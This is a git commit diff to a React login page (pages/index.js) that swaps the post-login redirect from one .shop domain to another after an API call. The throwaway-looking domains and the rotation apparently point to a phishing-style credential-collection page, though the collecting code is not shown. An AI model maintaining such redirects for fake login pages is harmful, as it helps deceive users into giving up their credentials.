75403f5c4ddc43676b81f58170f6a6b70c76f204
husknet <127146284+husknet@users.noreply.github.com>
2025-06-02 07:38:32 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nr.vertiza-ions.shop/';
+      window.location.href = 'https://nero.ugobest.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
